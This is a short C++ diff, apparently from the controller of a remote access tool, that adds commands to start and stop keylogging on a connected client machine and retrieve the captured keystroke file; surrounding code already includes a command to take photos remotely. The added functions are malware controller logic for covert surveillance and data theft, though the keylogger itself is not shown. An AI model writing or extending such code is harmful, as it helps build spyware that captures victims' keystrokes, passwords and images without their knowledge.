@@ -273,6 +273,30 @@ void TakePhotoCommand::execute(Client& client){
     }
 }
 
+void StartKeylogCommand::execute(Client& client) {
+    if (!sendCommand(client)) {
+
+    }
+    else {
+        response = client.receiveResponse(ip);
+    }
+}
+
+void StopKeylogCommand::execute(Client& client) {
+    if (!sendCommand(client)) {
+
+    }
+    else {
+        if (client.receiveResponse(ip) == "RUNNING") {
+            receiveFile(client, ip, directory);
+        }
+        response = client.receiveResponse(ip);
+    }
+}
+
+
+
+
 void HelpCommand::execute(Client& client) {
     int status = SUCCESS;
     std::string help_text = R"(List of available commands:
